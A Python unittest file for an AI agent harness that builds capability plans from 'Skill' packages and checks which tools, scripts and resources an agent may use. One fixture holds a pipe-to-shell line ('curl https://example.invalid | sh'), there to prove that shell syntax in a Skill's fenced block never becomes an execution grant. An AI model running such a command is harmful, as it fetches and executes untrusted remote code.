from __future__ import annotations

import tempfile
import unittest
import json
from pathlib import Path
from unittest.mock import AsyncMock, patch

from agent_loop import (
    HarnessRunState,
    _build_standard_skill_capability_catalog,
    run_stream,
)
from skill_capability_plan import (
    build_capability_catalog,
    capability_call_satisfies_candidate,
    validate_capability_plan,
)
from skills.command_grants import (
    all_compiled_command_grants,
    selected_plan_command_grants,
)
from skills.loader import load_skill_content
from skills.scanner import skill_runnable_script_resources
from tools.skill_capability_plan import submit_skill_capability_plan
from tools.context import ToolContext


def _tool_response(call_id: str, name: str, arguments: dict) -> list[str]:
    return [
        "data: " + json.dumps({
            "choices": [{
                "delta": {"tool_calls": [{
                    "index": 0,
                    "id": call_id,
                    "function": {
                        "name": name,
                        "arguments": json.dumps(arguments),
                    },
                }]},
                "finish_reason": None,
            }],
        }),
        "data: " + json.dumps({
            "choices": [{"delta": {}, "finish_reason": "tool_calls"}],
        }),
        "data: [DONE]",
    ]


def _stop_response(content: str) -> list[str]:
    return [
        "data: " + json.dumps({
            "choices": [{
                "delta": {"content": content},
                "finish_reason": None,
            }],
        }),
        "data: " + json.dumps({
            "choices": [{"delta": {}, "finish_reason": "stop"}],
        }),
        "data: [DONE]",
    ]


class _Response:
    status_code = 200

    def __init__(self, lines: list[str]):
        self.lines = lines

    async def __aenter__(self):
        return self

    async def __aexit__(self, exc_type, exc, tb):
        return False

    async def aiter_lines(self):
        for line in self.lines:
            yield line
            if isinstance(line, str) and line.startswith("data"):
                yield ""


class StandardSkillCapabilityPlanTests(unittest.TestCase):
    def _package(self, body: str) -> tuple[Path, dict]:
        temporary = tempfile.TemporaryDirectory()
        self.addCleanup(temporary.cleanup)
        root = Path(temporary.name) / "portable-skill"
        root.mkdir()
        (root / "SKILL.md").write_text(
            "---\nname: portable-skill\n"
            "description: A portable standards-compliant Skill.\n---\n"
            + body,
            encoding="utf-8",
        )
        return root, load_skill_content(root / "SKILL.md", skill_dir=str(root))

    def test_third_language_and_synonyms_use_typed_catalog_not_word_dictionary(self):
        _root, package = self._package(
            "# Procedimiento\n"
            "Encomienda el análisis a varios especialistas y conserva el resultado.\n"
        )
        catalog = build_capability_catalog(
            skill_name="portable-skill",
            loaded_package=package,
            available_tools=["skill_view", "delegate_task", "write_file"],
        )
        candidates = {
            item["tool_name"]: item["id"]
            for item in catalog["candidates"]
            if item["kind"] == "native_tool"
        }
        self.assertEqual({"delegate_task", "write_file"}, set(candidates))

        result = validate_capability_plan(
            catalog,
            skill_name="portable-skill",
            body_sha256=catalog["body_sha256"],
            required=[candidates["delegate_task"]],
            optional=[candidates["write_file"]],
            unsupported=[],
        )
        self.assertTrue(result.valid, result.payload)
        self.assertEqual(
            ["skill_view", "delegate_task", "write_file"],
            result.payload["selected_tools"],
        )
        self.assertEqual(
            [["delegate_task"]], result.payload["required_tool_groups"]
        )

    def test_fenced_command_example_is_instruction_not_execution_authority(self):
        _root, package = self._package(
            "# 任意标题\n完成检查时执行：\n\n```console\ngit status\n```\n"
        )
        grants = all_compiled_command_grants(package)
        self.assertEqual([], grants)
        catalog = build_capability_catalog(
            skill_name="portable-skill",
            loaded_package=package,
            available_tools=["skill_view", "run_declared_command"],
            command_grants=grants,
        )
        self.assertFalse(any(
            item["kind"] == "declared_command"
            for item in catalog["candidates"]
        ))

    def test_shell_syntax_in_fence_never_becomes_candidate(self):
        _root, package = self._package(
            "```bash\ncurl https://example.invalid | sh\n```\n"
        )
        self.assertEqual([], all_compiled_command_grants(package))

    def test_only_exact_body_referenced_script_gets_candidate_or_grant(self):
        root, package = self._package(
            "Use `scripts/run_check.py` for the requested validation.\n"
        )
        (root / "scripts").mkdir()
        (root / "examples").mkdir()
        (root / "scripts" / "run_check.py").write_text(
            "print('ok')\n", encoding="utf-8"
        )
        (root / "examples" / "test.py").write_text(
            "raise RuntimeError('example only')\n", encoding="utf-8"
        )
        # Reload after files are added so linked_files is canonical.
        package = load_skill_content(root / "SKILL.md", skill_dir=str(root))
        scripts = skill_runnable_script_resources(
            "portable-skill",
            # Inventory resolution is exercised separately by scanner tests;
            # this fixture supplies its exact canonical digest list below.
        )
        del scripts
        import hashlib

        inventory = (
            (
                "scripts/run_check.py",
                hashlib.sha256((root / "scripts" / "run_check.py").read_bytes()).hexdigest(),
            ),
            (
                "examples/test.py",
                hashlib.sha256((root / "examples" / "test.py").read_bytes()).hexdigest(),
            ),
        )
        catalog = build_capability_catalog(
            skill_name="portable-skill",
            loaded_package=package,
            available_tools=[
                "skill_view", "run_skill_script", "run_skill_python"
            ],
            runnable_scripts=inventory,
        )
        script_paths = {
            item["resource_path"]
            for item in catalog["candidates"]
            if item["kind"] == "skill_script"
        }
        self.assertEqual({"scripts/run_check.py"}, script_paths)
        self.assertNotIn("examples/test.py", script_paths)

    def test_exact_resource_references_accept_standard_root_spellings_only(self):
        for spelling in (
            "./scripts/run_check.py",
            "${SKILL_DIR}/scripts/run_check.py",
        ):
            with self.subTest(spelling=spelling):
                root, _package = self._package(f"Run `{spelling}`.\n")
                (root / "scripts").mkdir()
                (root / "examples").mkdir()
                script = root / "scripts" / "run_check.py"
                script.write_text("print('ok')\n", encoding="utf-8")
                unrelated = root / "examples" / "run_check.py"
                unrelated.write_text("raise RuntimeError\n", encoding="utf-8")
                package = load_skill_content(
                    root / "SKILL.md", skill_dir=str(root)
                )
                import hashlib

                catalog = build_capability_catalog(
                    skill_name="portable-skill",
                    loaded_package=package,
                    available_tools=["skill_view", "run_skill_python"],
                    runnable_scripts=(
                        (
                            "scripts/run_check.py",
                            hashlib.sha256(script.read_bytes()).hexdigest(),
                        ),
                        (
                            "examples/run_check.py",
                            hashlib.sha256(unrelated.read_bytes()).hexdigest(),
                        ),
                    ),
                )
                self.assertEqual(
                    {"scripts/run_check.py"},
                    {
                        item["resource_path"]
                        for item in catalog["candidates"]
                        if item.get("kind") == "skill_script"
                    },
                )

    def test_complete_body_after_old_scan_limit_can_reference_script(self):
        root, _package = self._package(
            ("説明だけの行です。\n" * 14000)
            + "最後に `scripts/finalize.py` を実行してください。\n"
        )
        (root / "scripts").mkdir()
        script = root / "scripts" / "finalize.py"
        script.write_text("print('done')\n", encoding="utf-8")
        package = load_skill_content(root / "SKILL.md", skill_dir=str(root))
        import hashlib

        digest = hashlib.sha256(script.read_bytes()).hexdigest()
        catalog = build_capability_catalog(
            skill_name="portable-skill",
            loaded_package=package,
            available_tools=["skill_view", "run_skill_script"],
            runnable_scripts=(("scripts/finalize.py", digest),),
        )
        self.assertGreater(catalog["body_chars"], 128_000)
        self.assertTrue(any(
            item.get("resource_path") == "scripts/finalize.py"
            and item.get("kind") == "skill_script"
            for item in catalog["candidates"]
        ))

    def test_unknown_id_and_stale_body_digest_fail_closed(self):
        _root, package = self._package("# Instructions\nDo the task.\n")
        catalog = build_capability_catalog(
            skill_name="portable-skill",
            loaded_package=package,
            available_tools=["skill_view", "write_file"],
        )
        unknown = validate_capability_plan(
            catalog,
            skill_name="portable-skill",
            body_sha256=catalog["body_sha256"],
            required=["tool-not-issued-by-backend"],
            optional=[],
            unsupported=[],
        )
        self.assertFalse(unknown.valid)
        self.assertEqual("capability_plan_unknown_id", unknown.payload["error_code"])
        stale = validate_capability_plan(
            catalog,
            skill_name="portable-skill",
            body_sha256="0" * 64,
            required=[],
            optional=[],
            unsupported=[{"instruction": "x", "reason": "no candidate"}],
        )
        self.assertFalse(stale.valid)
        self.assertEqual(
            "capability_plan_identity_mismatch", stale.payload["error_code"]
        )

    def test_optional_resource_on_same_bridge_cannot_satisfy_required_resource(self):
        root, _package = self._package(
            "Read `references/required.md`; `references/optional.md` is optional.\n"
        )
        (root / "references").mkdir()
        (root / "references" / "required.md").write_text("required", encoding="utf-8")
        (root / "references" / "optional.md").write_text("optional", encoding="utf-8")
        package = load_skill_content(root / "SKILL.md", skill_dir=str(root))
        catalog = build_capability_catalog(
            skill_name="portable-skill",
            loaded_package=package,
            available_tools=["skill_view"],
        )
        by_path = {
            item["resource_path"]: item
            for item in catalog["candidates"]
            if item.get("kind") == "skill_resource"
        }
        required = by_path["references/required.md"]
        optional = by_path["references/optional.md"]
        plan = validate_capability_plan(
            catalog,
            skill_name="portable-skill",
            body_sha256=catalog["body_sha256"],
            required=[required["id"]],
            optional=[optional["id"]],
            unsupported=[],
        )
        self.assertTrue(plan.valid, plan.payload)
        self.assertEqual(
            [required["id"]],
            [item["id"] for item in plan.payload["required_candidates"]],
        )
        self.assertFalse(capability_call_satisfies_candidate(
            required,
            tool_name="skill_view",
            args={
                "name": "portable-skill",
                "file_path": "references/optional.md",
            },
            result_data={"success": True, "has_more": False},
        ))
        self.assertFalse(capability_call_satisfies_candidate(
            required,
            tool_name="skill_view",
            args={
                "name": "portable-skill",
                "file_path": "references/required.md",
            },
            result_data={"success": True, "has_more": True},
            skill_resource_complete=False,
        ))
        self.assertTrue(capability_call_satisfies_candidate(
            required,
            tool_name="skill_view",
            args={
                "name": "portable-skill",
                "file_path": "references/required.md",
            },
            result_data={"success": True, "has_more": False},
            skill_resource_complete=True,
        ))

    def test_catalog_identity_covers_authority_bearing_frontmatter(self):
        root, first = self._package("# Instructions\nDo the task.\n")
        first_catalog = build_capability_catalog(
            skill_name="portable-skill",
            loaded_package=first,
            available_tools=["skill_view", "write_file"],
        )
        (root / "SKILL.md").write_text(
            "---\nname: portable-skill\n"
            "description: A portable standards-compliant Skill.\n"
            "allowed-tools: write_file\n---\n"
            "# Instructions\nDo the task.\n",
            encoding="utf-8",
        )
        second = load_skill_content(root / "SKILL.md", skill_dir=str(root))
        second_catalog = build_capability_catalog(
            skill_name="portable-skill",
            loaded_package=second,
            available_tools=["skill_view", "write_file"],
        )
        self.assertNotEqual(
            first_catalog["body_sha256"], second_catalog["body_sha256"]
        )

    def test_main_document_pagination_is_not_a_complete_receipt_until_eof(self):
        state = HarnessRunState(
            session_skill_names={"portable-skill"},
            skill_workflow_activation="relevant_skill_request",
        )
        digest = "a" * 64
        first = {
            "file": "SKILL.md",
            "content": "abc",
            "sha256": digest,
            "pagination": {
                "offset": 0,
                "returned_chars": 3,
                "total_chars": 6,
                "has_more": True,
                "next_offset": 3,
            },
        }
        self.assertFalse(
            state.record_skill_view({"name": "portable-skill"}, first)
        )
        self.assertNotIn(
            "skill.md", state.viewed_skill_files.get("portable-skill", set())
        )
        needed, reason = state.needs_more_skill_workflow()
        self.assertTrue(needed)
        self.assertIn("continue canonical Skill instructions", reason)

        last = {
            "file": "SKILL.md",
            "content": "def",
            "sha256": digest,
            "pagination": {
                "offset": 3,
                "returned_chars": 3,
                "total_chars": 6,
                "has_more": False,
                "next_offset": None,
            },
        }
        self.assertTrue(state.record_skill_view(
            {"name": "portable-skill", "file_path": "SKILL.md", "offset": 3},
            last,
        ))
        self.assertIn(
            "skill.md", state.viewed_skill_files.get("portable-skill", set())
        )

    def test_required_resource_receipt_rejects_page_skip_and_accepts_contiguous_eof(self):
        candidate = {
            "id": "resource-test",
            "kind": "skill_resource",
            "skill_name": "portable-skill",
            "resource_path": "references/large.md",
        }
        args_last = {
            "name": "portable-skill",
            "file_path": "references/large.md",
            "offset": 3,
        }
        last = {
            "file": "references/large.md",
            "content": "def",
            "sha256": "b" * 64,
            "pagination": {
                "offset": 3,
                "returned_chars": 3,
                "total_chars": 6,
                "has_more": False,
                "next_offset": None,
            },
        }
        skipped_state = HarnessRunState()
        skipped_complete = skipped_state.record_skill_view(args_last, last)
        self.assertFalse(skipped_complete)
        self.assertFalse(capability_call_satisfies_candidate(
            candidate,
            tool_name="skill_view",
            args=args_last,
            result_data=last,
            skill_resource_complete=skipped_complete,
        ))

        contiguous_state = HarnessRunState()
        args_first = {
            "name": "portable-skill",
            "file_path": "references/large.md",
            "offset": 0,
        }
        first = {
            "file": "references/large.md",
            "content": "abc",
            "sha256": "b" * 64,
            "pagination": {
                "offset": 0,
                "returned_chars": 3,
                "total_chars": 6,
                "has_more": True,
                "next_offset": 3,
            },
        }
        self.assertFalse(contiguous_state.record_skill_view(args_first, first))
        complete = contiguous_state.record_skill_view(args_last, last)
        self.assertTrue(complete)
        self.assertTrue(capability_call_satisfies_candidate(
            candidate,
            tool_name="skill_view",
            args=args_last,
            result_data=last,
            skill_resource_complete=complete,
        ))


class StandardSkillCapabilityPlanRunTests(unittest.IsolatedAsyncioTestCase):
    async def test_submit_reloads_main_digest_before_accepting_plan(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            root = Path(temp_dir) / "portable-skill"
            root.mkdir()
            main = root / "SKILL.md"
            main.write_text(
                "---\nname: portable-skill\ndescription: portable\n---\nDo it.\n",
                encoding="utf-8",
            )
            package = load_skill_content(main, skill_dir=str(root))
            catalog = build_capability_catalog(
                skill_name="portable-skill",
                loaded_package=package,
                available_tools=["skill_view", "write_file"],
            )
            write_id = next(
                item["id"] for item in catalog["candidates"]
                if item.get("tool_name") == "write_file"
            )
            context = ToolContext(
                user_id="u",
                session_id="s",
                enabled_tools=("submit_skill_capability_plan",),
                skill_capability_catalog=catalog,
            )
            main.write_text(
                "---\nname: portable-skill\ndescription: changed\n---\nDo it.\n",
                encoding="utf-8",
            )
            with patch("skills.scanner.resolve_skill_path", return_value=main):
                raw = await submit_skill_capability_plan(
                    skill_name="portable-skill",
                    body_sha256=catalog["body_sha256"],
                    required=[write_id],
                    optional=[],
                    unsupported=[],
                    context=context,
                )
        result = json.loads(raw)
        self.assertEqual("error", result["status"])
        self.assertEqual(
            "capability_plan_document_changed", result["error_code"]
        )

    async def test_plan_is_required_before_selected_tools_and_exact_boundary_install(self):
        provider = {
            "id": "mock-capability-plan",
            "base_url": "http://model.invalid/v1",
            "api_model": "mock-capability-plan",
            "api_key": "EMPTY",
            "protocol": "openai",
            "provider": "mock",
            "context_length": 64_000,
            "is_multimodal": True,
        }
        with tempfile.TemporaryDirectory() as temp_dir:
            root = Path(temp_dir) / "portable-skill"
            root.mkdir()
            (root / "SKILL.md").write_text(
                "---\nname: portable-skill\n"
                "description: Inspect one user-provided input when present.\n---\n"
                "# Method\nInspect the requested input and report a concrete gap if absent.\n",
                encoding="utf-8",
            )
            package = load_skill_content(root / "SKILL.md", skill_dir=str(root))
            enabled = [
                "skill_view",
                "submit_skill_capability_plan",
                "read_file",
                "write_file",
                "execute_code",
            ]
            catalog = _build_standard_skill_capability_catalog(
                "portable-skill", package, enabled, (),
            )
            by_tool = {
                item["tool_name"]: item["id"]
                for item in catalog["candidates"]
                if item.get("kind") == "native_tool"
            }
            plan_args = {
                "skill_name": "portable-skill",
                "body_sha256": catalog["body_sha256"],
                "required": [by_tool["read_file"]],
                "optional": [by_tool["write_file"]],
                "unsupported": [],
            }
            responses = [
                _tool_response(
                    "read-main", "skill_view", {"name": "portable-skill"}
                ),
                _tool_response(
                    "submit-plan", "submit_skill_capability_plan", plan_args
                ),
                _tool_response(
                    "use-selected", "read_file", {"filepath": "missing.txt"},
                ),
                _stop_response(
                    "已尝试读取，但工具返回 requested input is absent；"
                    "因此按具体失败降级报告，不声称读取成功。"
                ),
            ]
            request_bodies: list[dict] = []
            dispatch_contexts: list[tuple[str, object]] = []

            class Client:
                def __init__(self, *args, **kwargs):
                    pass

                async def __aenter__(self):
                    return self

                async def __aexit__(self, exc_type, exc, tb):
                    return False

                def stream(self, method, url, **kwargs):
                    request_bodies.append(kwargs["json"])
                    return _Response(responses.pop(0))

            async def fake_dispatch(name, args, *, context):
                dispatch_contexts.append((name, context))
                if name == "skill_view":
                    return json.dumps({
                        **package,
                        "success": True,
                        "skill_dir": str(root),
                    }, ensure_ascii=False)
                if name == "submit_skill_capability_plan":
                    return await submit_skill_capability_plan(
                        **args, context=context
                    )
                if name == "read_file":
                    return json.dumps({
                        "status": "error",
                        "error": "requested input is absent",
                    })
                raise AssertionError(name)

            skill_record = {
                "name": "portable-skill",
                "description": package["description"],
                "scope": "session",
                "path": str(root / "SKILL.md"),
                "skill_dir": str(root),
            }
            with (
                patch("workspace_context.WORKSPACE_ROOT", Path(temp_dir) / "ws"),
                patch("agent_loop.httpx.AsyncClient", Client),
                patch("agent_loop.dispatch", fake_dispatch),
                patch("agent_loop.build_system_prompt", return_value="system"),
                patch("agent_loop.load_workspace_context", return_value=""),
                patch("agent_loop._fetch_goal", AsyncMock(return_value=None)),
                patch("skills.scanner.find_all_skills", return_value=[skill_record]),
            ):
                events = [
                    event async for event in run_stream(
                        "mock-capability-plan",
                        [{
                            "role": "user",
                            "content": "请运行 portable-skill 完成任务",
                        }],
                        enabled,
                        provider_override=provider,
                        allow_session_mcp=False,
                        user_id="u-capability-plan",
                        session_id="s-capability-plan",
                        max_iterations=6,
                    )
                ]

        self.assertFalse(responses)
        model_tools = [
            {
                item["function"]["name"]
                for item in (body.get("tools") or [])
            }
            for body in request_bodies
        ]
        self.assertEqual({"skill_view"}, model_tools[0])
        self.assertEqual(
            {"submit_skill_capability_plan"}, model_tools[1]
        )
        self.assertIn("read_file", model_tools[2])
        self.assertIn("write_file", model_tools[2])
        self.assertNotIn("execute_code", model_tools[2])
        self.assertNotIn("submit_skill_capability_plan", model_tools[2])
        self.assertEqual(
            set(), model_tools[3],
            "an exact failed dispatch is a degraded receipt, not a replay loop",
        )
        self.assertFalse(any(
            event.get("type") == "tool_progress"
            and "Enforcing" in str(event.get("msg") or "")
            for event in events
        ))
        dispatch_context = next(
            context for name, context in dispatch_contexts
            if name == "read_file"
        )
        self.assertEqual(
            {"skill_view", "read_file", "write_file"},
            set(dispatch_context.enabled_tools),
        )
        self.assertEqual({"type": "done", "finish_reason": "stop"}, events[-1])

    async def test_stop_gate_does_not_credit_optional_resource_on_shared_bridge(self):
        provider = {
            "id": "mock-exact-receipt",
            "base_url": "http://model.invalid/v1",
            "api_model": "mock-exact-receipt",
            "api_key": "EMPTY",
            "protocol": "openai",
            "provider": "mock",
            "context_length": 64_000,
            "is_multimodal": True,
        }
        with tempfile.TemporaryDirectory() as temp_dir:
            root = Path(temp_dir) / "portable-skill"
            (root / "references").mkdir(parents=True)
            (root / "SKILL.md").write_text(
                "---\nname: portable-skill\n"
                "description: Read an exact required reference.\n---\n"
                "Read `references/required.md`; `references/optional.md` is optional.\n",
                encoding="utf-8",
            )
            for name in ("required.md", "optional.md"):
                (root / "references" / name).write_text(name, encoding="utf-8")
            package = load_skill_content(root / "SKILL.md", skill_dir=str(root))
            enabled = ["skill_view", "submit_skill_capability_plan"]
            catalog = _build_standard_skill_capability_catalog(
                "portable-skill", package, enabled, (),
            )
            by_path = {
                item["resource_path"]: item["id"]
                for item in catalog["candidates"]
                if item.get("kind") == "skill_resource"
            }
            responses = [
                _tool_response("main", "skill_view", {"name": "portable-skill"}),
                _tool_response("plan", "submit_skill_capability_plan", {
                    "skill_name": "portable-skill",
                    "body_sha256": catalog["body_sha256"],
                    "required": [by_path["references/required.md"]],
                    "optional": [by_path["references/optional.md"]],
                    "unsupported": [],
                }),
                _tool_response("optional", "skill_view", {
                    "name": "portable-skill",
                    "file_path": "references/optional.md",
                }),
                _stop_response("premature"),
                _tool_response("required", "skill_view", {
                    "name": "portable-skill",
                    "file_path": "references/required.md",
                }),
                _stop_response("complete"),
            ]
            request_bodies: list[dict] = []

            class Client:
                def __init__(self, *args, **kwargs):
                    pass

                async def __aenter__(self):
                    return self

                async def __aexit__(self, exc_type, exc, tb):
                    return False

                def stream(self, method, url, **kwargs):
                    request_bodies.append(kwargs["json"])
                    return _Response(responses.pop(0))

            async def fake_dispatch(name, args, *, context):
                if name == "submit_skill_capability_plan":
                    return await submit_skill_capability_plan(**args, context=context)
                if name != "skill_view":
                    raise AssertionError(name)
                path = args.get("file_path")
                if not path:
                    return json.dumps({
                        **package,
                        "success": True,
                        "skill_dir": str(root),
                    }, ensure_ascii=False)
                content = (root / path).read_text(encoding="utf-8")
                return json.dumps({
                    "success": True,
                    "name": "portable-skill",
                    "file": path,
                    "content": content,
                    "has_more": False,
                }, ensure_ascii=False)

            skill_record = {
                "name": "portable-skill",
                "description": package["description"],
                "scope": "session",
                "path": str(root / "SKILL.md"),
                "skill_dir": str(root),
            }
            with (
                patch("workspace_context.WORKSPACE_ROOT", Path(temp_dir) / "ws"),
                patch("agent_loop.httpx.AsyncClient", Client),
                patch("agent_loop.dispatch", fake_dispatch),
                patch("agent_loop.build_system_prompt", return_value="system"),
                patch("agent_loop.load_workspace_context", return_value=""),
                patch("agent_loop._fetch_goal", AsyncMock(return_value=None)),
                patch("skills.scanner.find_all_skills", return_value=[skill_record]),
            ):
                events = [event async for event in run_stream(
                    "mock-exact-receipt",
                    [{"role": "user", "content": "运行 portable-skill"}],
                    enabled,
                    provider_override=provider,
                    allow_session_mcp=False,
                    user_id="u-exact-receipt",
                    session_id="s-exact-receipt",
                    max_iterations=8,
                )]

        self.assertFalse(responses)
        self.assertTrue(any(
            event.get("type") == "tool_progress"
            and "Enforcing" in str(event.get("msg") or "")
            for event in events
        ))
        exposed = [
            {item["function"]["name"] for item in body.get("tools") or []}
            for body in request_bodies
        ]
        self.assertEqual({"skill_view"}, exposed[3])
        self.assertEqual(set(), exposed[5])
        self.assertEqual({"type": "done", "finish_reason": "stop"}, events[-1])

    async def test_empty_unsupported_plan_converges_without_required_call_loop(self):
        provider = {
            "id": "mock-empty-plan",
            "base_url": "http://model.invalid/v1",
            "api_model": "mock-empty-plan",
            "api_key": "EMPTY",
            "protocol": "openai",
            "provider": "mock",
            "context_length": 64_000,
            "is_multimodal": True,
        }
        with tempfile.TemporaryDirectory() as temp_dir:
            root = Path(temp_dir) / "portable-skill"
            root.mkdir()
            (root / "SKILL.md").write_text(
                "---\nname: portable-skill\ndescription: Needs unavailable input.\n---\n"
                "Use an unavailable external capability and report the gap.\n",
                encoding="utf-8",
            )
            package = load_skill_content(root / "SKILL.md", skill_dir=str(root))
            enabled = [
                "skill_view", "submit_skill_capability_plan", "read_file"
            ]
            catalog = _build_standard_skill_capability_catalog(
                "portable-skill", package, enabled, (),
            )
            read_id = next(
                item["id"] for item in catalog["candidates"]
                if item.get("tool_name") == "read_file"
            )
            responses = [
                _tool_response("main", "skill_view", {"name": "portable-skill"}),
                _tool_response("plan", "submit_skill_capability_plan", {
                    "skill_name": "portable-skill",
                    "body_sha256": catalog["body_sha256"],
                    "required": [],
                    "optional": [read_id],
                    "unsupported": [{
                        "instruction": "Use unavailable external capability",
                        "reason": "No backend-issued candidate exists",
                    }],
                }),
                _tool_response(
                    "optional-read", "read_file", {"filepath": "optional.txt"}
                ),
                _stop_response("已明确报告能力缺口。"),
            ]
            request_bodies: list[dict] = []

            class Client:
                def __init__(self, *args, **kwargs):
                    pass

                async def __aenter__(self):
                    return self

                async def __aexit__(self, exc_type, exc, tb):
                    return False

                def stream(self, method, url, **kwargs):
                    request_bodies.append(kwargs["json"])
                    return _Response(responses.pop(0))

            async def fake_dispatch(name, args, *, context):
                if name == "skill_view":
                    return json.dumps({
                        **package,
                        "success": True,
                        "skill_dir": str(root),
                    }, ensure_ascii=False)
                if name == "submit_skill_capability_plan":
                    return await submit_skill_capability_plan(**args, context=context)
                if name == "read_file":
                    return json.dumps({
                        "status": "error",
                        "error": "optional input absent",
                    })
                raise AssertionError(name)

            skill_record = {
                "name": "portable-skill",
                "description": package["description"],
                "scope": "session",
                "path": str(root / "SKILL.md"),
                "skill_dir": str(root),
            }
            with (
                patch("workspace_context.WORKSPACE_ROOT", Path(temp_dir) / "ws"),
                patch("agent_loop.httpx.AsyncClient", Client),
                patch("agent_loop.dispatch", fake_dispatch),
                patch("agent_loop.build_system_prompt", return_value="system"),
                patch("agent_loop.load_workspace_context", return_value=""),
                patch("agent_loop._fetch_goal", AsyncMock(return_value=None)),
                patch("skills.scanner.find_all_skills", return_value=[skill_record]),
            ):
                events = [event async for event in run_stream(
                    "mock-empty-plan",
                    [{"role": "user", "content": "运行 portable-skill"}],
                    enabled,
                    provider_override=provider,
                    allow_session_mcp=False,
                    user_id="u-empty-plan",
                    session_id="s-empty-plan",
                    max_iterations=5,
                )]

        self.assertFalse(responses)
        self.assertEqual(4, len(request_bodies))
        self.assertFalse(any(
            event.get("type") == "tool_progress"
            and "Enforcing" in str(event.get("msg") or "")
            for event in events
        ))
        self.assertFalse(any(
            event.get("type") == "tool_progress"
            and "Recovering failed tool" in str(event.get("msg") or "")
            for event in events
        ))
        self.assertEqual({"type": "done", "finish_reason": "stop"}, events[-1])

    async def test_multiple_unattempted_required_candidates_get_one_correction_only(self):
        provider = {
            "id": "mock-bounded-required",
            "base_url": "http://model.invalid/v1",
            "api_model": "mock-bounded-required",
            "api_key": "EMPTY",
            "protocol": "openai",
            "provider": "mock",
            "context_length": 64_000,
            "is_multimodal": True,
        }
        with tempfile.TemporaryDirectory() as temp_dir:
            root = Path(temp_dir) / "portable-skill"
            root.mkdir()
            (root / "SKILL.md").write_text(
                "---\nname: portable-skill\ndescription: Perform two exact actions.\n---\n"
                "Perform both required actions, or report that they were not attempted.\n",
                encoding="utf-8",
            )
            package = load_skill_content(root / "SKILL.md", skill_dir=str(root))
            enabled = [
                "skill_view", "submit_skill_capability_plan",
                "read_file", "write_file",
            ]
            catalog = _build_standard_skill_capability_catalog(
                "portable-skill", package, enabled, (),
            )
            by_tool = {
                item["tool_name"]: item["id"]
                for item in catalog["candidates"]
                if item.get("kind") == "native_tool"
            }
            responses = [
                _tool_response("main", "skill_view", {"name": "portable-skill"}),
                _tool_response("plan", "submit_skill_capability_plan", {
                    "skill_name": "portable-skill",
                    "body_sha256": catalog["body_sha256"],
                    "required": [by_tool["read_file"], by_tool["write_file"]],
                    "optional": [],
                    "unsupported": [],
                }),
                _stop_response("未执行。"),
                _stop_response("仍未执行。"),
            ]
            request_count = 0

            class Client:
                def __init__(self, *args, **kwargs):
                    pass

                async def __aenter__(self):
                    return self

                async def __aexit__(self, exc_type, exc, tb):
                    return False

                def stream(self, method, url, **kwargs):
                    nonlocal request_count
                    request_count += 1
                    return _Response(responses.pop(0))

            async def fake_dispatch(name, args, *, context):
                if name == "skill_view":
                    return json.dumps({
                        **package,
                        "success": True,
                        "skill_dir": str(root),
                    }, ensure_ascii=False)
                if name == "submit_skill_capability_plan":
                    return await submit_skill_capability_plan(**args, context=context)
                raise AssertionError(f"unexpected dispatch: {name}")

            skill_record = {
                "name": "portable-skill",
                "description": package["description"],
                "scope": "session",
                "path": str(root / "SKILL.md"),
                "skill_dir": str(root),
            }
            with (
                patch("workspace_context.WORKSPACE_ROOT", Path(temp_dir) / "ws"),
                patch("agent_loop.httpx.AsyncClient", Client),
                patch("agent_loop.dispatch", fake_dispatch),
                patch("agent_loop.build_system_prompt", return_value="system"),
                patch("agent_loop.load_workspace_context", return_value=""),
                patch("agent_loop._fetch_goal", AsyncMock(return_value=None)),
                patch("skills.scanner.find_all_skills", return_value=[skill_record]),
            ):
                events = [event async for event in run_stream(
                    "mock-bounded-required",
                    [{"role": "user", "content": "运行 portable-skill"}],
                    enabled,
                    provider_override=provider,
                    allow_session_mcp=False,
                    user_id="u-bounded-required",
                    session_id="s-bounded-required",
                    max_iterations=8,
                )]

        self.assertFalse(responses)
        self.assertEqual(4, request_count)
        self.assertEqual(1, sum(
            event.get("type") == "tool_progress"
            and "Enforcing" in str(event.get("msg") or "")
            for event in events
        ))
        self.assertEqual("error", events[-1]["type"])
        self.assertIn("without performing", events[-1]["msg"])


if __name__ == "__main__":
    unittest.main()
